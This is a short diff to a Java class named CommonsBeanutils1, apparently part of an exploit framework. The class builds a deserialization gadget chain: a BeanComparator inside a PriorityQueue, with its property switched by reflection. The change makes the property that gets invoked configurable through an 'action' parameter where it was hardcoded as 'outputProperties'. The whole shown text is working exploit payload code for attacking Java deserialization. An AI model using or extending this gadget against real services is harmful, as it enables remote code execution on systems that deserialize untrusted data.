@@ -32,7 +32,7 @@ public class CommonsBeanutils1 extends Payload<Object> {
     @Override
     public Object pack(Object obj) throws Exception {
         final BeanComparator comparator = new BeanComparator("lowestSetBit");
-
+        String action = bullet.get("action");
         // create queue with numbers and basic comparator
         final PriorityQueue<Object> queue = new PriorityQueue<Object>(2, comparator);
         // stub data for replacement later
@@ -40,7 +40,7 @@ public class CommonsBeanutils1 extends Payload<Object> {
         queue.add(new BigInteger("1"));
 
         // switch method called by comparator
-        ReflectionHelper.setFieldValue(comparator, "property", "outputProperties");
+        ReflectionHelper.setFieldValue(comparator, "property", action);
 
         // switch contents of queue
         final Object[] queueArray = (Object[]) ReflectionHelper.getFieldValue(queue, "queue");
@@ -49,4 +49,5 @@ public class CommonsBeanutils1 extends Payload<Object> {
 
         return queue;
     }
+
 }
